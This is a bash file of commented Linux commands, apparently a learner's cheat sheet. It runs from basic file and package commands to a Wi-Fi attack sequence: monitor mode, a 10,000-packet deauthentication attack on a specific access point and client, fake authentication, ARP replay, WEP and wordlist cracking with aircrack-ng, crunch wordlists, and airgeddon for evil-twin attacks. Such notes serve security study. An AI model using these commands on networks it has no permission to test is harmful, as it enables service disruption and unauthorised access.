#!/bin/bash

# Lists files and directories in the current directory.
ls

# Creates a new file named test.txt.
touch test.txt

# Clears the terminal screen.
clear

# Deletes a file named test. (Only for files, not directories.)
rm test

# Moves up one directory level.
cd ..

# Displays the current working directory.
pwd

# Creates a new directory named test.
mkdir test

# Force deletes the test file, regardless of whether it exists. (Not for directories.)
rm -f test

# Deletes the test directory and all its contents.
rm -r test

# Forcefully deletes the test directory and all its contents without asking for confirmation.
rm -rf test

# Moves Komutlar.txt file to the test directory.
mv Komutlar.txt test/Komutlar.txt

# Copies Komutlar.txt file to the test directory.
cp Komutlar.txt test/Komutlar.txt

# Grants root (superuser) privileges in the terminal and switches to the root user.
sudo su

# Updates the package list of the package manager, fetching the latest information from repositories.
apt update

# Upgrades all installed packages to their latest versions.
apt upgrade

# Downloads and installs the Wireshark package.
apt install wireshark

# Searches for packages in the repositories that match the given name.
apt search <package_name>

# Creates or opens the text file 'test.txt' and allows editing.
nano test.txt

# Displays the contents of the 'test.txt' file in the terminal.
cat test.txt

# Lists all files and directories, including hidden ones, in detail.
ls -la

# Shows the network interfaces' configuration and IP addresses. (On some systems, 'ip addr' may be used instead.)
ifconfig

# Used to change the user's local password.
passwd

# Sends 4 packets to 'google.com' to test network connectivity.
ping -c 4 google.com

# Shows the file attributes of Komutlar.txt.
lsattr Komutlar.txt

# Removes the 'immutable' attribute from Komutlar.txt, allowing modifications.
chattr -i Komutlar.txt

# Establishes a VPN connection using the 'vpnbook-ca149-tcp443.ovpn' configuration file.
openvpn vpnbook-ca149-tcp443.ovpn

# Puts the specified network interface into monitor mode.
airmon-ng start <interface>

# Scans for Wi-Fi networks using the network interface in monitor mode.
airodump-ng <interface>

# Performs an on-network scan for a specific Wi-Fi network and writes the results to the 'test' file.
airodump-ng --channel 2 --bssid 88:AC:C0:42:9C:F1 --write test wlan0mon

# Sends 10,000 deauthentication packets to the specified device on a Wi-Fi network, disconnecting it.
aireplay-ng --deauth 10000 -a 88:AC:C0:42:9C:F1 -c 02:EB:D8:07:11:B2 wlan0mon

# Performs a fake authentication on the specified Wi-Fi network.
aireplay-ng --fakeauth 0 -a 88:AC:C0:42:9C:F1 -h 02:EB:D8:07:11:B2 wlan0mon

# Performs an ARP replay attack after fake authentication on the specified Wi-Fi network.
aireplay-ng --arpreplay -b 88:AC:C0:42:9C:F1 -h 02:EB:D8:07:11:B2 wlan0mon

# Cracks WEP Wi-Fi networks by decrypting the captured IVS files to recover the password.
aircrack-ng test.cap

# Shows the IP and MAC addresses of network interfaces.
ip addr

# Attempts to crack a password using a wordlist on the CAP file.
aircrack-ng test.cap -w wordlist.txt

# Creates a wordlist with character lengths between 8 and 9, using the characters 'xy123'.
crunch 8 9 xy123 -o outputwordlist.txt

# Searches for the term 'emin' within the wordlist.txt file.
cat wordlist.txt | grep emin

# A tool used for Evil Twin attacks (supports various Wi-Fi attack methods).
airgeddon
